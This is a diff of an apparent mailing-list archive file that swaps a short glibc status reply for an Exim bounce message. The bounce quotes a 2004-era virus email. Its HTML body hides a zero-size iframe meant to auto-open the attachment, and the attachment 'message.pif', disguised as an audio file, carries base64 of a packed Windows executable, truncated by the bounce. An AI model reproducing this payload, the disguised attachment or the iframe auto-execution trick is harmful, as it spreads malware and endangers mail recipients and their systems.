@@ -1,19 +1,16 @@
-Return-Path: <carlos@baldric.uwo.ca>
-Received: from baldric (baldric.uwo.ca [129.100.10.225])
-	by dsl2.external.hp.com (Postfix) with ESMTP id 21EAA482F
+Return-Path: <>
+Received: from mr2.cc.ic.ac.uk (mr2.cc.ic.ac.uk [155.198.5.112])
+	by dsl2.external.hp.com (Postfix) with ESMTP id 1877F482F
 	for <parisc-linux@lists.parisc-linux.org>;
-	Mon,  3 May 2004 20:08:52 -0600 (MDT)
-Date: Mon, 3 May 2004 15:19:11 -0400
-From: Carlos O'Donell <carlos@baldric.uwo.ca>
-To: Joel Soete <soete.joel@tiscali.be>
-Subject: Re: [parisc-linux] hppa glibc status 2004-05-01
-Message-ID: <20040503191911.GD5274@baldric.uwo.ca>
-References: <20040501180143.GW12850@baldric.uwo.ca>
-	<408D439D00004B0C@ocpmta3.freegates.net>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-In-Reply-To: <408D439D00004B0C@ocpmta3.freegates.net>
-Cc: parisc-linux@lists.parisc-linux.org
+	Mon,  3 May 2004 21:26:23 -0600 (MDT)
+Received: from exim by mr2.cc.ic.ac.uk with local (Exim 3.36 #1)
+	id 1BKY5O-0007kj-02
+	for parisc-linux@lists.parisc-linux.org; Mon, 03 May 2004 08:41:58 +0100
+From: Mail Delivery System <Mailer-Daemon@imperial.ac.uk>
+To: parisc-linux@lists.parisc-linux.org
+Message-Id: <E1BKY5O-0007kj-02@mr2.cc.ic.ac.uk>
+Date: Mon, 03 May 2004 08:41:58 +0100
+Subject: [parisc-linux] Mail delivery failed: returning message to sender
 List-Id: parisc-linux developers list <parisc-linux.lists.parisc-linux.org>
 List-Unsubscribe: <http://lists.parisc-linux.org/mailman/listinfo/parisc-linux>,
 	<mailto:parisc-linux-request@lists.parisc-linux.org?subject=unsubscribe>
@@ -23,13 +20,159 @@ List-Help: <mailto:parisc-linux-request@lists.parisc-linux.org?subject=help>
 List-Subscribe: <http://lists.parisc-linux.org/mailman/listinfo/parisc-linux>,
 	<mailto:parisc-linux-request@lists.parisc-linux.org?subject=subscribe>
 
-On Mon, May 03, 2004 at 04:28:05PM +0000, Joel Soete wrote:
-> Just finished the make -k check of the today cvs co (ie 20040503) and no
-> more Errors then well known ones :)
-> 
-> Thanks a lot,
->     Joel
+This message was created automatically by mail delivery software (Exim).
 
-Thanks for checking!
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
-c.
+  p.owen@imperial.ac.uk
+    This message has been rejected because it has
+    a potentially executable attachment "message.pif"
+    This form of attachment has been used by
+    recent viruses or other malware.
+    If you meant to send this file then please
+    package it up as a zip file and resend it.
+
+------ This is a copy of the message, including all the headers. ------
+------ The body of the message is 39519 characters long; only the first
+------ 5120 or so are included here.
+
+Return-path: <parisc-linux@lists.parisc-linux.org>
+Received: from [203.81.210.3] (helo=ic.ac.uk)
+	by mr2.cc.ic.ac.uk with esmtp (Exim 3.36 #1)
+	id 1BKY4d-0007ij-02
+	for p.owen@imperial.ac.uk; Mon, 03 May 2004 08:41:11 +0100
+From: parisc-linux@lists.parisc-linux.org
+To: p.owen@imperial.ac.uk
+Subject: Delivery Bot (p.owen@ic.ac.uk)
+Date: Mon, 3 May 2004 12:41:11 +0500
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	type="multipart/alternative";
+	boundary="----=_NextPart_000_001B_01C0CA81.7B015D10"
+X-Priority: 1
+X-MSMail-Priority: High
+Message-Id: <E1BKY4d-0007ij-02@mr2.cc.ic.ac.uk>
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_001B_01C0CA81.7B015D10
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_001C_01C0CA81.7B015D10"
+
+------=_NextPart_001_001C_01C0CA81.7B015D10
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+------=_NextPart_001_001C_01C0CA81.7B015D10
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META content=3D"text/html; charset=3Diso-8859-1" =
+http-equiv=3DContent-Type>
+<META content=3D"MSHTML 5.00.2920.0" name=3DGENERATOR>
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=3D#ffffff><br>Mail Delivery Failure - This mail couldn't be shown.<br><br>------------- failed message -------------<br>:äMeF+*CB|HPjböZ)*Y?!0A9>%|W,a49LWz1a3E|n1<br><k(ß%g,I%>Rxh4C-*abV!Ha,+->2'b&<06f4j%(5i-cVPJ<br>i6O'__LX<NBüWyPk1-Fäh+rz_KoXR.|76#KqSz2qnUpjR<br>,0!DHJß+wwAAnazäOYo7CL6-bY~D3üR4*dw0U7(<br><br>Translated message has been attached.<br>
+
+Or you can view the message at:<br><br>
+<a href=3Dcid:121401Mfdab4$3f3dL780$75387018@57W81fa70Re height=3D0 width=3D0>www.ic.ac.uk/inmail/p.owen/mread.php?sessionid-26313</a>
+<iframe
+src=3Dcid:121401Mfdab4$3f3dL780$75387018@57W81fa70Re height=3D0 width=3D0></iframe> 
+<DIV>&nbsp;</DIV></BODY></HTML>
+
+------=_NextPart_001_001C_01C0CA81.7B015D10--
+
+------=_NextPart_000_001B_01C0CA81.7B015D10
+Content-Type: audio/x-wav;
+	name="message.pif"
+Content-Transfer-Encoding: base64
+Content-ID:<121401Mfdab4$3f3dL780$75387018@57W81fa70Re>
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA6AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
+RE9TIG1vZGUuDQ0KJAAAAAAAAAAxzIXZda3rinWt64p1reuKda3qimet64oXsviKcK3rip2y
+4Ip3reuKzavtinSt64pSaWNoda3rigAAAAAAAAAAQ29tcHJlc3NlZCBieSBQZXRpdGUgKGMp
+MTk5OSBJYW4gTHVjay4AAFBFAABMAQMA76BkQAAAAAAAAAAA4AAPAQsBBgAABAAAAGYAAAAA
+AABCoAAAABAAAAAgAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAALAAAAAEAAAAAAAA
+AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA/KEAANAAAAAAQAAAaF8AAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAMAAAABAAAAAGAAAACAAAAAAAAAAAAAAAAAAAYAAA4AAAAAAAAAAAAGAAAABAAABoXwAA
+AA4AAAAAAAAAAAAAAAAAAEAAAEAucGV0aXRlAMwCAAAAoAAAAAQAAAAEAAAAAAAAAAAAAAAA
+AABgAADiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+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
+AgAAAKgAAIAAAAAAAAAAAAAAAAABAAAAIAEAgMAAAIAAAAAAAAAAAAAAAAAAAAEABwQAANgA
+AAAAAAAAAAAAAAAAAAAAAAEABwQAAOgAAAAAAAAAAAAAAAAAAAAAAAEABwQAAPgAAAAAAAAA
+AAAAAAAAAAAAAAEABwQAAAgBAABkRQAAAFoAAAAAAAAAAAAAPEQAACgBAAAAAAAAAAAAAFRB
+AADoAgAAAAAAAAAAAAAwQQAAIgAAAAAAAAAAAAAAAwBCAEkATgABADAAAAAAAAAAAAAAAAAA
+AAABAAIAEBAQAAEABAAoAQAAAQAgIBAAAQAEAOgCAAACAAAAKAAAACAAAABAAAAAAQAEAAAA
+AACAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAIAAAACAgACAAAAAgACAAICAAADAwMAA
+gICAAAAA/wAA/wAAAP//AP8AAAD/AP8A//8AAP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAACIiIiIiIiIiIiIiIiIgAAAj////////////////4AAAIf///////////////eAAACP
+f/////////////9/gAAAj/f////////////3/4AAAI//f///////////f/+AAACP//f/////
+////9///gAAAj///f////////3///4AAAI////f///////f///+AAACP//93d3d3d3d3f///
+gAAAj//3f39/f39/f3f//4AAAI//d/f39/f39/f3f/+AAACP939/f39/f39/f3f/gAAAh3f3
+9/f39/f39/f3d4AAAI9/f39/f39/f39/f3+AAACP////////////////AAAACP//////////
+////8AAAAACP/////////////wAAAAAACP////////////AAAAAAAACP//////////8AAAAA
+AAAACP/////////wAAAAAAAAA
